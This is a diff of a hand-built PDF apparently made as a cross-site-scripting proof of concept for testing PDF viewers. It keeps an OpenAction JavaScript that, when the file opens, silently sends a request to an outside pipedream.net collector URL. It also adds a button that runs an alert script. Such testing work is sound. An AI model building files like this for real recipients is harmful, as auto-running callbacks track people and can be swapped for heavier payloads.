@@ -1,21 +1,25 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /AcroForm << /Fields [] >> /OpenAction 11 0 R /Metadata 16 0 R >>
+<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /AcroForm << /Fields [18 0 R] >> /OpenAction 11 0 R /Metadata 16 0 R >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents [4 0 R 13 0 R] /Resources 5 0 R /Annots [17 0 R] >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents [4 0 R] /Resources 5 0 R /Annots [17 0 R 18 0 R] >>
 endobj
 4 0 obj
 << /Length 44 >>
 stream
-BT /F1 12 Tf 100 700 Td (Version 1 Payload) Tj ET
+BT
+/F1 12 Tf
+100 700 Td
+(Version 1 Payload) Tj
+ET
 endstream
 endobj
 5 0 obj
-<< /Font << /F1 6 0 R >> /XObject << /Img1 15 0 R >> >>
+<< /Font << /F1 6 0 R >> >>
 endobj
 6 0 obj
 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R >>
@@ -28,51 +32,42 @@ endobj
 endobj
 11 0 obj
 << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://eoy4evvlsf7y0jq.m.pipedream.net?version=1', true); xhr.send(); alert('Version 1 GET Payload Sent');) >>
-endస
-endobj
-13 0 obj
-<< /Length 84 >>
-stream
-q 50 0 0 50 150 500 cm /Img1 Do Q
-endstream
-endobj
-15 0 obj
-<< /Type /XObject /Subtype /Image /Width 50 /Height 50 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode /Length 100 >>
-stream
-<<PNG_DATA>>
-endstream
 endobj
 16 0 obj
 << /Type /Metadata /Subtype /XML /Length 92 >>
 stream
-<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description><dc:title>Version 1 PDF with GIF</dc:title></rdf:Description></rdf:RDF>
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description><dc:title>PDF with XSS PoC</dc:title></rdf:Description></rdf:RDF>
 endstream
 endobj
 17 0 obj
 << /Type /Annot /Subtype /Link /Rect [100 400 200 420] /A << /S /URI /URI (https://gotphp.com/) >> /Border [0 0 1] /C [0 0 1] >>
 endobj
+18 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (XSSButton) /Rect [150 500 250 520] /A << /S /JavaScript /JS (alert('XSS PoC');) >> >>
+endobj
 xref
-0 18
+0 19
 0000000000 65535 f 
 0000000010 00000 n 
 0000000095 00000 n 
 0000000152 00000 n 
-0000000245 00000 n 
-0000000315 00000 n 
-0000000353 00000 n 
-0000000465 00000 n 
+0000000213 00000 n 
+0000000283 00000 n 
+0000000321 00000 n 
+0000000433 00000 n 
 0000000000 65535 f 
 0000000000 65535 f 
-0000000551 00000 n 
-0000000586 00000 n 
+0000000519 00000 n 
+0000000554 00000 n 
 0000000000 65535 f 
-0000000713 00000 n 
 0000000000 65535 f 
-0000000827 00000 n 
-0000000941 00000 n 
-0000001033 00000 n 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000681 00000 n 
+0000000773 00000 n 
+0000000865 00000 n 
 trailer
-<< /Size 18 /Root 1 0 R >>
+<< /Size 19 /Root 1 0 R >>
 startxref
-1177
+957
 %%EOF
